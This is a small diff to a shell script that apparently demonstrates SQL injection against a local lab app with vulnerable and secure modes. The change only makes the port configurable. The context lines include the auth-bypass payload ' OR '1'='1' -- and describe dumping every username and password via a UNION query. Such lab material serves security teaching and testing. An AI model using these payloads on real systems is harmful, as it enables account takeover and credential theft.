@@ -3,7 +3,7 @@
 # then dumps every username+password via a UNION in the note search.
 # Works on VULN mode (http://localhost:3000); FAILS on SECURE mode.
 set -euo pipefail
-BASE="${1:-http://localhost:3000}"
+BASE="${1:-http://localhost:${PORT:-3000}}"
 CURL="curl -sk"
 
 echo "== 1. auth bypass: login with  ' OR '1'='1' --"
